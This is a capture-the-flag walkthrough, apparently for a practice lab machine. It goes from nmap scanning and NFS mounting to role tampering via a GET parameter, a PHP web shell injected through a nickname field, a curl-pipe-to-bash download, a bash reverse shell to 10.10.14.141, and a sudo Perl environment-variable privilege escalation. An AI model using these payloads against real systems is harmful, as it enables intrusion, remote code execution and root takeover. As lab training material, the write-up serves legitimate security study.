1. ran nmap -p- <IP>

	Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-24 12:47 EDT
	Nmap scan report for   ** 10.10.11.232**
	Host is up (0.054s latency).
	Not shown: 65526 closed tcp ports (reset)
	PORT      STATE SERVICE
	22/tcp    open  ssh
	80/tcp    open  http
	111/tcp   open  rpcbind
	2049/tcp  open  nfs
	34203/tcp open  unknown
	37465/tcp open  unknown
	42413/tcp open  unknown
	44549/tcp open  unknown
	48765/tcp open  unknown

The ports of interest are:

		22/tcp ssh
		80/tcp http
		2049/tcp nfs


NFS is a network file share services so it would conation juicy information

2. look at what on NFS using "showmount -e <IP>"
	
	Export list for 10.10.11.232:
	/mnt/backups *

After running the command we are giving a list of items that are 
public on the NFS

3. We will mount to the NFS "mount -t nfs 10.10.11.232:/mnt/backups 
<mount location on local machine>"

One it mounts you are able to see the files within the location you set.
For this example we are giving code on how the website works
and interacts with the data.

4. once reviewing the code it was noticed that how the website saves the
game could be are way in

5. once testing how the game saves we notice that it saves within the header

6. we can give ourself admin within the site buy crafting a 
different GET request:

GET /save_game.php?clicks=10&level=10&role/**/=Admin


7. we are able to see the top scores and request an export which is hosted 
on the site. The request can be changed from .txt to a .php. This is how
we will use the shell.

8. Send the shell as a saved player through the nickname function

GET /save_game.php?clicks=10&level=10&nickname=<?php+system($_GET['cmd']);?>

9. Then send a export request and change it to php. once request we are able to 
to use cmd within the url

#10 use curl http://IP:PORT/shell.sh | bash within the url but ensure to 
include %20 for all spaces once in we get web access.

11. Upgrade shell script /dev/null -c bash
 

shell.sh

shell.sh                                                             
bash -i >& /dev/tcp/10.10.14.141/1234 0>&1


php reverse shell:

<?php+system($_GET['cmd']);?>


perl exploit :
sudo PERL50PT=-d PERL5DB='exec "ls /root"' /opt/monitor.sh
<?xml version="1.0"?>

sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh

bash -p
 
#link: https://www.exploit-db.com/exploits/39702?source=post_page-----1b15edf443b8--------------------------------
